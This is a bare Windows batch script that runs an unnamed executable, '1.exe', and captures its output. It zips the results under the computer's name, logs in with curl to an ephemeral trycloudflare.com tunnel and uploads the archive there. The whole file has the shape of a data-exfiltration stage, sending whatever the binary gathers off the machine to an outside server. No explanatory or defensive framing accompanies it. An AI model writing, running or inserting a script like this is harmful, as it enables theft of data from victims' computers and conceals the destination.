@echo off
cd /d "%~dp0"
"1.exe" > g.txt 2>&1
move g.txt results\g.txt
powershell -Command "Compress-Archive -Path 'results' -DestinationPath 'result_%COMPUTERNAME%.zip' -Force"
curl -c cookies.txt -d "name=alex" -d "pass=123" https://small-logos-intimate-feed.trycloudflare.com/Login/login.php
curl -b cookies.txt -F "submit=1" -F "file[]=@result_%COMPUTERNAME%.zip" https://small-logos-intimate-feed.trycloudflare.com/Login/upload.php
